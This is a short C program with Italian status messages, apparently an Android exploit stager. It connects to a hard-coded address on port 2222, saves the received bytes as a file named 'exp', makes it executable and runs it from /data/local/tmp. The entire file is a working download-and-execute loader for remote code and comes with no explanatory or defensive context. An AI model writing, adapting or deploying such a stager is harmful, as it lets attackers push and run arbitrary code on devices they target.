#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>


int sockfd, portno, n;
int off = 0;
int readed;
struct sockaddr_in server_addr;
struct hostent *hp;
char buffer[0x1000];
char expname[] = "exp";
char cmd[256];
FILE *file;

int main() {

  file = fopen(expname, "w");
  hp = gethostbyname("192.168.69.130");
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(2222);

  server_addr.sin_addr.s_addr = ((struct in_addr*)(hp->h_addr)) -> s_addr;


  sockfd = socket(AF_INET, SOCK_STREAM, 0);

  if(connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr))) {
    printf("Errore di connessione al server\n");
  }
  else printf("Connessione stabilita\n");

  memset(buffer, 0, sizeof(buffer));
  while( readed = recv(sockfd, buffer, sizeof(buffer), 0)) {
    int written = fwrite(&buffer, 1, readed, file);
    memset(buffer, 0, sizeof(buffer));
    }

  fclose(file);
  close(sockfd);

  chmod(expname, 0711);

  

  memset(cmd, 0, sizeof(cmd));
  sprintf(cmd, "/data/local/tmp/%s", expname);

  system(cmd);

  return 0;
}
